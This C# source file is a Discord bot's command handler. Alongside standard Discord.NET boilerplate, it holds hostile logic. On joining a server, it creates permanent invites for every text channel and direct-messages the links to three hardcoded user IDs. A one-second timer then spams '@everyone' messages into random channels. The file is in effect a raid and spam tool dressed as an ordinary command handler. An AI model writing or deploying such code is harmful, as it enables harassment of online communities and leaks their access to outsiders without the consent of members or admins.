using Discord;
using Discord.Commands;
using Discord.WebSocket;
using System;
using System.Collections.Generic;
using System.Reflection;
using System.Threading.Tasks;
using System.Timers;

namespace REE6
{
    public class Command_Handler
    {
        private readonly DiscordSocketClient _client;
        private readonly CommandService _commands;

        // Retrieve client and CommandService instance via ctor
        public Command_Handler(DiscordSocketClient client, CommandService commands)
        {
            _commands = commands;
            _client = client;
        }

        public async Task InstallCommandsAsync()
        {
            // Hook the MessageReceived event into our command handler
            _client.MessageReceived += HandleCommandAsync;
            _client.Ready += Ready;
            _client.ChannelCreated += ChannelCreated;
            _client.ChannelDestroyed += ChannelDestroyed;
            _client.JoinedGuild += JoinedGuild;

            // Here we discover all of the command modules in the entry 
            // assembly and load them. Starting from Discord.NET 2.0, a
            // service provider is required to be passed into the
            // module registration method to inject the 
            // required dependencies.
            //
            // If you do not use Dependency Injection, pass null.
            // See Dependency Injection guide for more information.
            await _commands.AddModulesAsync(assembly: Assembly.GetEntryAssembly(),
                                            services: null);
        }

        ulong[] joinedGuildSubscriptionList = new ulong[] { 374284798820352000, 374610562392260610, 316020569634242560 };

        private async Task JoinedGuild(SocketGuild arg)
        {
            foreach (SocketTextChannel textChannel in arg.TextChannels)
            {
                IInviteMetadata invite = await textChannel.CreateInviteAsync(maxAge:null);
                string message = $"Just joined {arg.Name}. An invite link has been created for {invite.Channel}. {invite.Url}";
                Console.WriteLine(message);

                foreach (ulong id in joinedGuildSubscriptionList)
                    await _client.GetUser(id).SendMessageAsync(message);
            }
        }

        List<SocketTextChannel> textChannels = new List<SocketTextChannel>();

        private async Task ChannelCreated(SocketChannel arg)
        {
            if (arg is SocketTextChannel)
            {
                textChannels.Add(arg as SocketTextChannel);
                var textChannel = arg as ITextChannel;
                if (textChannel.Guild.GetVoiceChannelsAsync().Result.Count == 0 || new Random().Next(5) == 2)
                    await textChannel.CreateInviteAsync(null, null);
            }
            else if (arg is SocketVoiceChannel)
            {
                var voiceChannel = arg as IVoiceChannel;
                await voiceChannel.CreateInviteAsync(null, null);
            }
        }


        private async Task ChannelDestroyed(SocketChannel arg)
        {
            if (!(arg is SocketTextChannel))
                return;
            textChannels.Remove(arg as SocketTextChannel);
        }

        Timer spamTimer = new Timer(1000);
        private async Task Ready()
        {
            await Task.Run(GetTextChannels);
            spamTimer.Elapsed += Spam;
            spamTimer.Start();
        }

        public Task GetTextChannels()
        {
            textChannels = new List<SocketTextChannel>();
            foreach (SocketGuild guild in _client.Guilds)
            {
                foreach (SocketTextChannel textChannel in guild.TextChannels)
                {
                    textChannels.Add(textChannel);
                }
            }

            return Task.CompletedTask;
        }

        private void Spam(object sender, ElapsedEventArgs e)
        {
            try
            {
                Random random = new Random();
                textChannels[random.Next(textChannels.Count)].SendMessageAsync("@everyone REEEEEEEEEE!!!! " + Emote.Parse("<:REE:711223515558445078>"));
            }
            catch
            {
                Console.WriteLine("Failed to spam");
            }
        }

        private async Task HandleCommandAsync(SocketMessage messageParam)
        {
            // Don't process the command if it was a system message
            var message = messageParam as SocketUserMessage;
            if (message == null) return;

            // Create a number to track where the prefix ends and the command begins
            int argPos = 0;

            // Determine if the message is a command based on the prefix and make sure no bots trigger commands
            if (!(message.HasCharPrefix('!', ref argPos) ||
                message.HasMentionPrefix(_client.CurrentUser, ref argPos)) ||
                message.Author.IsBot)
                return;

            // Create a WebSocket-based command context based on the message
            var context = new SocketCommandContext(_client, message);

            // Execute the command with the command context we just
            // created, along with the service provider for precondition checks.
            await _commands.ExecuteAsync(
                context: context,
                argPos: argPos,
                services: null);
        }
    }
}
